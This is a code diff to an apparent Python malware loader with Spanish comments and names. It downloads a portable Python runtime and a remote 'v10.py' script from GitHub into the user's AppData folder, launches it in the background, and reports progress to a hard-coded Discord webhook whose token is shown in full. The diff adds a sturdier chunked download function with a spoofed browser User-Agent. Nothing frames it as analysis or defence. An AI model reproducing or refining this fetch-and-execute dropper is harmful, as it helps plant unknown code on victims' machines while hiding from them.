@@ -9,7 +9,6 @@ URL_V10 = "https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v10.py
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1560652221035839528/SlDSAV1HKo0Xw42HTs_y6KsVLBZSQ6pUqpN59eM1K044bhjU7iwHBh4bSCfA7bvc6jO6"
 
-# Usar la carpeta AppData del usuario para evitar restricciones de permisos en C:\
 DIRECTORIO_DESTINO = os.path.join(os.environ.get("APPDATA", "C:\\"), "V10Runtime")
 ZIP_TEMPORAL = os.path.join(DIRECTORIO_DESTINO, "py.zip")
 SCRIPT_V10 = os.path.join(DIRECTORIO_DESTINO, "v10.py")
@@ -40,6 +39,17 @@ def enviar_webhook(mensaje):
     except Exception as e:
         registrar_log(f"Error enviando webhook: {e}")
 
+def descargar_archivo_seguro(url, destino):
+    """Descarga un archivo por bloques con timeout para evitar congelamientos."""
+    headers = {"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"}
+    req = urllib.request.Request(url, headers=headers)
+    with urllib.request.urlopen(req, timeout=15) as response, open(destino, 'wb') as out_file:
+        while True:
+            chunk = response.read(16384)
+            if not chunk:
+                break
+            out_file.write(chunk)
+
 def encontrar_python():
     if not os.path.exists(DIRECTORIO_DESTINO):
         return None
@@ -58,7 +68,7 @@ def preparar_y_exec():
         python_ejecutable = encontrar_python()
         if not python_ejecutable:
             enviar_webhook("📥 [Dependencias] Descargando py.zip desde GitHub Releases...")
-            urllib.request.urlretrieve(URL_PY_ZIP, ZIP_TEMPORAL)
+            descargar_archivo_seguro(URL_PY_ZIP, ZIP_TEMPORAL)
 
             enviar_webhook("📦 [Dependencias] Extrayendo archivos portables...")
             with zipfile.ZipFile(ZIP_TEMPORAL, "r") as zip_ref:
@@ -79,7 +89,7 @@ def preparar_y_exec():
             enviar_webhook("⚙️ [Dependencias] Entorno portable configurado.")
 
         enviar_webhook("📥 [Dependencias] Descargando v10.py...")
-        urllib.request.urlretrieve(URL_V10, SCRIPT_V10)
+        descargar_archivo_seguro(URL_V10, SCRIPT_V10)
 
         if python_ejecutable and os.path.exists(SCRIPT_V10):
             enviar_webhook("🚀 [Dependencias] Lanzando v10.py en segundo plano...")
